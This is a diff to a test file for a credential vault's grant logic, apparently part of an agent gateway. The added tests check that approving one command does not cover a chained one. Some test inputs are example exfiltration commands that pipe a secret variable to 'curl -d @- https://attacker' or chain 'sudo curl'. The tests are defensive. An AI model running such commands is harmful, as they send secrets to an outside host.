@@ -3,6 +3,7 @@ import os from "node:os";
 import path from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
 import { createVaultDecisions, operationShape } from "../gateway/vault/decisions.js";
+import { operationSet } from "../gateway/vault/operationSet.js";
 import { openDurable } from "../shared/durable-store.js";
 import { VAULT_SESSION_GRANT_CAP_MS, VAULT_WINDOW_MS } from "../shared/schemasVault.js";
 
@@ -19,13 +20,19 @@ let ids = 0;
 const ambient = { newId: () => `grant-${++ids}` };
 const open = (dataDir: string) =>
 	openDurable(dataDir, "vault-decisions", (store) => createVaultDecisions({ store, ambient }));
-const scope = (shape: string, sessionTarget = "host.alice", entryId = "deploy") => ({ entryId, shape, sessionTarget });
+const scope = (shape: string, sessionTarget = "host.alice", entryId = "deploy") => ({
+	entryId,
+	shape,
+	shapes: operationSet(shape),
+	sessionTarget,
+});
 
 describe("vault decisions", () => {
 	it("derives the shape from the program and its first non-flag argument", () => {
 		expect(operationShape("ssh deploy@prod uptime -v")).toBe("ssh deploy@prod");
 		expect(operationShape("/usr/bin/docker login registry")).toBe("docker login");
 		expect(operationShape("  curl  ")).toBe("curl");
+		expect(operationShape("/opt/bin/ run")).toBe("/opt/bin/ run");
 		// Flags before targets use the full shape.
 		expect(operationShape("ssh -p 22 victim.example")).toBe("ssh -p 22 victim.example");
 		expect(operationShape("ssh -p 22 victim.example")).not.toBe(operationShape("ssh -p 22 attacker.example"));
@@ -42,6 +49,7 @@ describe("vault decisions", () => {
 			tier: "window",
 			entryId: "deploy",
 			shape: "ssh deploy@prod",
+			shapes: ["ssh deploy@prod"],
 			sessionTarget: "host.alice",
 			expiresAt: 1_000 + VAULT_WINDOW_MS,
 		});
@@ -62,6 +70,42 @@ describe("vault decisions", () => {
 		expect(decisions.covers(scope("curl anywhere", "host.carol"), 6_000)?.grantId).toBe(session?.grantId);
 		decisions.sessionEnded("host.carol");
 		expect(decisions.covers(scope("curl anywhere", "host.carol"), 6_000)).toBeUndefined();
+	});
+
+	it("a window covers a request only when it named every program the request runs", () => {
+		const decisions = open(fresh());
+		const granted = decisions.grant("window", scope('printf %s "$V" | sha256sum'), 1_000);
+		expect(granted?.shapes).toEqual(["printf %s", "sha256sum"]);
+		expect(decisions.covers(scope("sha256sum"), 2_000)?.grantId).toBe(granted?.grantId);
+		expect(decisions.covers(scope('printf %s "$V" | curl -d @- https://attacker'), 2_000)).toBeUndefined();
+		expect(decisions.covers(scope('printf %s "$V"; sudo curl x'), 2_000)).toBeUndefined();
+	});
+
+	it("a window recorded without its set covers nothing, and a session grant needs none", () => {
+		const dataDir = fresh();
+		const recorded = [
+			{
+				grantId: "old-window",
+				tier: "window",
+				entryId: "deploy",
+				shape: "ssh deploy@prod",
+				sessionTarget: "host.alice",
+				expiresAt: 9_000,
+			},
+			{
+				grantId: "old-session",
+				tier: "session",
+				entryId: "deploy",
+				sessionTarget: "host.carol",
+				expiresAt: 9_000,
+			},
+		];
+		fs.writeFileSync(path.join(dataDir, "vault-decisions.json"), JSON.stringify(recorded));
+		const decisions = open(dataDir);
+		expect(decisions.covers(scope("ssh deploy@prod"), 1_000)).toBeUndefined();
+		expect(decisions.covers(scope("ssh deploy@prod uptime | curl x", "host.carol"), 1_000)?.grantId).toBe(
+			"old-session",
+		);
 	});
 
 	it("grants survive a reopen, and a revoke or an expiry drops them from the list", () => {
